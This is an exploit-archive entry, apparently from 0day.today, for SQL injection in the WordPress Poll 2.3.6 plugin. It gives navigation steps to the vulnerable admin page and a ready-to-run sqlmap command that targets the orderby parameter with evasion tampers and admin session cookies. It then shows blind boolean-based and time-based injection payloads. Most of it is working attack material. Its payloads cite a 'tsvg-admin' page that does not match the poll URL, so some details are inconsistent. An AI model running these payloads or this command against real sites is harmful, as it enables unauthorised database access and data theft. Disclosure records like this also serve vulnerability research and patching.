@@ -1,0 +1,53 @@
+id: 39679
+date: 07/09/2024
+title: WordPress Poll 2.3.6 SQL Injection Vulnerability
+author: tmrswrr
+cves: 
+
+# Exploit Title: WordPress Poll Plugin SQL Injection 
+# Exploit Author: tmrswrr
+# Category : Webapps
+# Vendor Homepage: https://total-soft.com/wp-poll/
+# Version 2.3.6
+
+
+1. **Access the Admin Panel:**
+   - Navigate to the admin panel of your WordPress site.
+   - Go to `TS Poll  > `Create Pool ` > ` Use Theme` and save it. > https://localhost/wordpress/wp-admin/admin.php?page=ts-poll-builder&tsp-id=1
+     ```
+2. After save it back to TS Video Gallery Click title : https://localhost/wordpress/wp-admin/admin.php?page=ts-poll&orderby=Question_Title&order=desc
+3. Search for orderby parameter.
+
+
+## SQLMAP COMMAND
+
+python3 sqlmap.py -u "https://localhost/wordpress/wp-admin/admin.php?page=ts-poll&orderby=Question_Title&order=desc" \
+--batch \
+--dbms=mysql \
+--thread=10 \
+--no-cast \
+--random-agent \
+-v 3 \
+--tamper="between,randomcase,space2comment" \
+--level=5 \
+--risk=3 \
+-p orderby \
+--cookie="wordpress_logged_in_d31d6d9d0bfd834c03c5a471886561f0=admin|1720435164|r5jSRyl4XMzcZz3xllDos9veD7hga8U8qFIWPQHv5Kr|e111b736b22043864d0f8ea6da823ca00768a110af4da612c555add1979839d1; wordpress_sec_d31d6d9d0bfd834c03c5a471886561f0=admin|1720435164|r5jSRyl4XMzcZz3xllDos9veD7hga8U8qFIWPQHv5Kr|173622110c7f3812695b26c96ba4905a7c760ac41e37645150dd4869ae884c4b; wordpress_test_cookie=WP Cookie check; wp-settings-time-1=1720266472"
+
+
+## RESULT
+
+---
+Parameter: orderby (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: page=tsvg-admin&orderby=(SELECT (CASE WHEN (1078=1078) THEN 0x54535f56475f5469746c65 ELSE (SELECT 2977 UNION SELECT 8545) END))&order=desc
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: page=tsvg-admin&orderby=TS_VG_Title AND (SELECT 6127 FROM (SELECT(SLEEP(5)))mIWx)&order=desc
+    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
+---
+
+#  0day.today [2024-07-16]  #
